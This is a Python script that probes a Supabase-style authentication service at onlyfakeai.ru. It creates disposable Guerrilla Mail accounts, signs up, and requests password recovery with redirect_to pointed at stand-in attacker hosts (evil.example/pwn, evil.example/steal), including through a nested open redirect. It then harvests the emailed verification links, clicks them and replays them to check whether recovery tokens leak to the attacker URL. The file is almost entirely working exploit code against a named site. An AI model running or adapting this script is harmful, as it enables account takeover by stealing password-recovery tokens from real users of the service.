import ssl, json, urllib.request, urllib.error, urllib.parse, sys, time, random, re
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
ctx = ssl.create_default_context()
KEY = "<publishable-key>"
SUPA = "https://cdn.onlyfakeai.ru"
GM = "https://api.guerrillamail.com/ajax.php"
UA = {"User-Agent": "Mozilla/5.0", "Accept": "application/json", "Content-Type": "application/json"}

def req(method, url, body=None, token=None, extra=None, follow=True):
    h = dict(UA)
    if token: h["Authorization"] = f"Bearer {token}"
    if extra: h.update(extra)
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(url, data=data, headers=h, method=method)
    class NoRedir(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, *a, **k): return None
    opener = urllib.request.build_opener(urllib.request.HTTPRedirectHandler() if follow else NoRedir)
    try:
        with opener.open(r, timeout=30) as resp:
            return resp.status, dict(resp.headers), resp.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode("utf-8", "ignore")
    except Exception as e:
        return 0, {}, repr(e)

def gm_new():
    st, hd, b = req("GET", GM + "?f=get_email_address&lang=en&site=guerrillamail.com")
    d = json.loads(b)
    local = d["email_addr"].split("@")[0]
    return f"{local}@sharklasers.com", d["sid_token"]

def gm_list(sid):
    st, hd, b = req("GET", GM + f"?f=get_email_list&offset=0&sid_token={sid}")
    try:
        d = json.loads(b)
        return d.get("list", [])
    except Exception:
        return []

def gm_fetch(sid, mid):
    st, hd, b = req("GET", GM + f"?f=fetch_email&email_id={mid}&sid_token={sid}")
    try:
        return json.loads(b)
    except Exception:
        return {"raw": b[:1000]}

def wait_mail(sid, limit=16):
    for i in range(limit):
        time.sleep(4)
        lst = gm_list(sid)
        if lst:
            return lst
        print(f"  ..wait {i+1} {lst if lst else ''}")
    return []

def click_and_report(links, label):
    for u in links:
        if "verify" not in u and "token=" not in u:
            continue
        u = u.replace("&amp;", "&")
        st, hd, b = req("GET", u, extra={"apikey": KEY}, follow=False)
        loc = hd.get("Location") or hd.get("location") or ""
        print(f"\n[{label}] click verify: {st} Location={loc[:700]}")
        st2, hd2, b2 = req("GET", u, extra={"apikey": KEY}, follow=False)
        print(f"[{label}] replay: {st2} {b2[:180]}")
        return loc
    return None

def extract_links(d):
    parts = []
    for k in ("mail_body", "mail_body_text", "mail_body_html"):
        v = d.get(k)
        if isinstance(v, str): parts.append(v)
    body = "\n".join(parts)
    body = urllib.parse.unquote(body) if "%3A%2F%2F" in body[:400] and "http" not in body else body
    links = re.findall(r"https?://[^\s\"'<>\)]+", body) + re.findall(r"https?://[^\s\"'<>\)]+", urllib.parse.unquote(body))
    return list(dict.fromkeys(links)), body

def run_case(label, redirect_to, mode="recover"):
    print(f"\n########## {label} mode={mode} redirect_to={redirect_to} ##########")
    addr, sid = gm_new()
    print("gm addr:", addr)
    pw = "Zq7#vL2!mX9$wR4"
    st, hd, b = req("POST", SUPA + "/auth/v1/signup", {"email": addr, "password": pw}, extra={"apikey": KEY})
    print("signup:", st, b[:100])
    try: sess = json.loads(b)
    except Exception: sess = {}
    utok = sess.get("access_token")
    if mode == "recover":
        st, hd, b = req("POST", SUPA + "/auth/v1/recover", {"email": addr, "redirect_to": redirect_to}, extra={"apikey": KEY})
    else:
        st, hd, b = req("PUT", SUPA + "/auth/v1/user", {"email": redirect_to[0], "redirect_to": redirect_to[1]}, token=utok, extra={"apikey": KEY})
    print("request:", st, b[:200])
    lst = wait_mail(sid)
    print("mails:", len(lst))
    all_links = []
    for m in lst[:2]:
        d = gm_fetch(sid, m.get("mail_id"))
        print(" from:", d.get("mail_from"), "| subject:", d.get("mail_subject"))
        links, body = extract_links(d)
        print(" body excerpt:", re.sub(r"\s+", " ", body)[:700])
        for u in links:
            print("  LINK:", u[:420])
        all_links += links
    return all_links

# CASE A: recovery, redirect_to = apex nested open-redirect path
linksA = run_case("A recover+deep-redirect", "https://onlyfakeai.ru/login?redirect=https%3A%2F%2Fevil.example%2Fpwn")
locA = click_and_report(linksA, "A")
# CASE B: recovery, foreign redirect (expect site_url fallback)
linksB = run_case("B recover+foreign", "https://evil.example/steal")
locB = click_and_report(linksB, "B")
print("\nSUMMARY A Location:", (locA or "")[:400])
print("SUMMARY B Location:", (locB or "")[:400])
